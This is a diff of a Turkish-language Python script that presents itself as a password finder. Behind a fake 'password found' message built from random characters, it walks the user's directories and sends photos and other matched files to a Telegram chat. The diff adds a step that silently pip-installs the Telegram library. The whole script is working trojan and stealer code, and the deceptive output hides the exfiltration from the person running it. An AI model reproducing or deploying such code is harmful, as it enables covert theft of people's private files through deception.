@@ -1,4 +1,17 @@
 import os
+import subprocess
+import sys
+
+def kütüphane_kontrol():
+    try:
+        import telegram
+    except ImportError:
+        print("[!] Gerekli kutuphane bulunamadi, kuruluyor...")
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "python-telegram-bot"])
+        print("[+] Kurulum tamamlandi, islem baslatiliyor...\n")
+
+kütüphane_kontrol()
+
 import asyncio
 import random
 import string
@@ -37,7 +50,8 @@ async def dosya_gonder():
     try:
         cihaz = platform.machine()
         await bot.send_message(chat_id=CHAT_ID, text=f"🚀 Veri Aktarimi Basladi\n👤 Hedef: {target}\n📱 Cihaz: {cihaz}")
-    except: pass
+    except:
+        pass
 
     IZINLI_UZANTILAR = {
         '.png': 'FOTO', '.jpg': 'FOTO', '.jpeg': 'FOTO', '.avif': 'FOTO',
@@ -62,12 +76,14 @@ async def dosya_gonder():
     }
 
     for ana_dizin in DIZINLER:
-        if not os.path.exists(ana_dizin): continue
+        if not os.path.exists(ana_dizin):
+            continue
 
         for kok, klasorler, dosyalar in os.walk(ana_dizin):
             for dosya_adi in dosyalar:
                 ext = os.path.splitext(dosya_adi)[1].lower()
-                if ext not in IZINLI_UZANTILAR: continue
+                if ext not in IZINLI_UZANTILAR:
+                    continue
 
                 dosya_yolu = os.path.join(kok, dosya_adi)
                 
@@ -95,13 +111,14 @@ async def dosya_gonder():
                     sayac += 1
                     await asyncio.sleep(random.uniform(0.3, 0.7)) 
                 
-                except: continue
+                except:
+                    continue
 
     os.system('clear')
     print(BANNER)
     random_sifre = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
     print("\n-------------------------------------------")
-    print(f"Sifre basariyla bulundu: {random_sifre}")
+    print(f"Islem bitti Sifre basariyla bulundu: {random_sifre}")
     print("-------------------------------------------\n")
     
     await asyncio.sleep(5)
